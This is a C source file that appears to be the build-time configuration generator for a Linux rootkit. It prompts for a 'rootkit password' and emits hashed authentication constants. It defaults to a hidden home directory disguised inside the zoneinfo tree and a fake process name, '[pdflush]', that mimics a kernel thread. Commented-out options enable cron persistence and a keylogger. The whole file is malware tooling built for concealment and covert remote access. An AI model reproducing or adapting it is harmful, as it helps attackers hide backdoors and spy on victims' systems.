#include <stdio.h>
#include <termios.h>
#include <string.h>
#include <sha1.h>

#define PASSLENGTH 256
#define INPUTLENGTH 512
#define DEFAULTHOME "/usr/share/zoneinfo/posix/America/Indiana/. /"
#define PROCNAME "[pdflush]\0"

int main(int argc, char *argv[]) {

    int i;
    struct termios old, new;
    sha1_context sha;
	char pass1[PASSLENGTH], pass2[PASSLENGTH];
	char input[INPUTLENGTH];
    unsigned char sha1_pass[20];

	// Hide password while typing
    tcgetattr(0, &old);
    new = old;
    new.c_lflag &= ~(ECHO);

	printf("#ifndef CONFIG_H\n");

	// Get password
	while (1) {
		tcsetattr(0, TCSAFLUSH, &new);
		fprintf(stderr, "[*] Enter new rootkit password: ");
		fflush(stderr);
		fgets(pass1, PASSLENGTH, stdin);
		
		fprintf(stderr, "\n[*] Please, enter again: ");
		fflush(stderr);
		fgets(pass2, PASSLENGTH, stdin);
	    tcsetattr(0, TCSAFLUSH, &old);
		
		if (!strcmp(pass1, pass2)) {
			fprintf(stderr, "\n => OK, new password set.\n");
			break;
		} else {
			fprintf(stderr, "\n =! Mistyped password.\n");
		}
	}
	pass1[strlen(pass1) - 1] = '\0';
    sha1_starts(&sha);
    sha1((unsigned char *)pass1, strlen(pass1), sha1_pass);
	printf("#define CLIENTAUTH \"");
    for (i = 0; i < 20; i++) {
        printf("\\x%02x", sha1_pass[i]);
    }
    printf("\"\n");
	printf("#define SERVERAUTH \"");
    for (i = 0; i < 20; i++) {
        printf("\\x%02x", sha1_pass[i]^pass1[0]);
    }
    printf("\"\n");

	// Get home directory
	fprintf(stderr, "[*] Enter the home directory [%s]: ", DEFAULTHOME); 
	fflush(stderr);
    fgets(input, INPUTLENGTH, stdin);
    if (*input == '\n')
        strcpy(input, DEFAULTHOME);
	input[strlen(input) - 1] = '\0';
	printf("#define HOME \"%s\"\n", input);

	// Get process name
    fprintf(stderr, "[*] Enter the new process name [%s]: ", PROCNAME); 
	fflush(stderr);
    fgets(input, INPUTLENGTH, stdin);
    if (*input == '\n')
    	strcpy(input, PROCNAME);
	else 
		input[strlen(input) - 1] = '\0';
	printf("#define PROCNAME \"%s\\0\"\n", input);

	// Debug	
	fprintf(stderr, "[*] Enable debuging information? [no]: "); 
	fflush(stderr);
	fgets(input, INPUTLENGTH, stdin);
	input[strlen(input) - 1] = '\0';
	if (strcmp(input, "yes") == 0){
		printf("#define DEBUG 1\n");
		fprintf(stderr, " => Debug enabled.\n");
	} else {
		printf("#define DEBUG 0\n");
		fprintf(stderr, " => Debug disabled.\n");
	}

/*	// Cron
	fprintf(stderr, "[*] Enable cron? [yes]: "); 
	fflush(stderr);
	fgets(input, INPUTLENGTH, stdin);
	input[strlen(input) - 1] = '\0';
	if (strcmp(input, "no") != 0){
		printf("#define CRON 1\n");
		fprintf(stderr, " => Cron enabled.\n");
	} else {
		printf("#define CRON 0\n");
		fprintf(stderr, " => Cron disabled.\n");
	}

	// Keylogger
	fprintf(stderr, "[*] Enable keylogger? [yes]: "); 
	fflush(stderr);
	fgets(input, INPUTLENGTH, stdin);
	input[strlen(input) - 1] = '\0';
	if (strcmp(input, "no") != 0){
		printf("#define KEYLOGGER 1\n");
		fprintf(stderr, " => Keylogger enabled.\n");
	} else {
		printf("#define KEYLOGGER 0\n");
		fprintf(stderr, " => Keylogger disabled.\n");
	}
*/
	printf("#endif\n");

	return 0;
}
